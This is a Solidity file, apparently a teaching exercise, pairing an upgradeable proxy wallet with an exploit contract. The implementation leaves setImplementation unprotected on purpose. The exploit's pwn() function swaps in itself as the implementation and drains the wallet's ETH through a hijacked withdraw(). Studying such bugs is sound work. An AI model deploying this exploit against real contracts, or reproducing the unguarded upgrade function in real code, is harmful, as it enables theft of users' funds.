// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract UpgradeableWallet {
    address public implementation;
    address public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }
}

contract WalletImplementation {
    address public implementation;
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    receive() external payable {}

    function setImplementation(address _implementation) external {
        implementation = _implementation;
    }

    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
    }
}

contract UpgradeableWalletExploit {
    address public target;

    constructor(address _target) {
        // target is address of UpgradableWallet
        target = _target;
    }

    // accept ETH from UpgradeableWallet
    receive() external payable {}

    function _call(bytes memory data) private {
        (bool executed, ) = target.call(data);
        require(executed, "failed");
    }

    function pwn() external {
        _call(
            abi.encodeWithSignature("setImplementation(address)", address(this))
        );
        _call(abi.encodeWithSignature("withdraw()"));
    }

    function withdraw() external {
        // this code is executed inside UpgradeableWallet
        // msg.sender = this exploit contract
        // address(this).balance = ETH balance of UpgradeableWallet
        payable(msg.sender).transfer(address(this).balance);
    }
}
